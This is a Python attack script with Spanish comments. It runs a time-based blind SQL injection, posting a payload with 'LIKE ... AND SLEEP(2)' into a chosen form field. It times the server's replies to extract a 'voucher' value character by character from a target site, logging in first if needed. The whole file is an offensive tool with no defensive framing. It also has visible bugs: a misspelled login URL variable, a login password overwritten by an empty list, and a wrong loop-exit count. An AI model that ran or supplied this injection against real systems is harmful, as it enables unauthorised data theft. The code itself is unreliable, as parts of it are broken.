import requests
import string
import time

url = 'https://example.com' # URL a atacar
ulrLogin = '' # URL de login
user = 'admin' # usuario para loguearse en caso de que se requiera login para efectuar el ataque
password = 'p@ssw0rd' # contraseña para loguearse en caso de que se requiera login para efectuar el ataque
inputName = 'user' # nombre del campo a inyectar
# El código de inyección se encuentra en la linea 24

session = requests.Session()

password = list()

def main():
    global urlLogin
    start = time.time()
    if len(ulrLogin) > 4:
        login = session.post(urlLogin, data = { 'username' : f'{user}', 'password' : f'{password}' , 'submit' : 'submit' })
    while True:

        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '¡@#$%^&*()_+' # todo el abecedario / caracteres para probar
        count = 0
        for c in chars:

            print('trying: ' + "".join(password) + c)
            injection = f"' AnD BINARY voucher LIKE '" + "".join(password) + f"{c}%' AnD SLEEP(2) #" # <====== Código de Inyección
            startTime = time.time()
            content = session.post(url, data = { f'{inputName}' : injection, 'submit' : 'submit' }) # cambiar el "user" por el nombre del campo 
            endTime = time.time()
            totalTime = endTime - startTime

            count += 1

            if totalTime > 2:
                password.append(c)
                break
            elif totalTime < 2 and count == 16:
                end = time.time()
                finalPassword = "".join(password)
                print(f'La contraseña para el usuario: {user} es: {finalPassword} - tiempo: {round(end - start, 2)}')
                exit(0)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('[*] Exiting...')
        exit(1)
    finally:
        print('[! Programa finalizado !]')
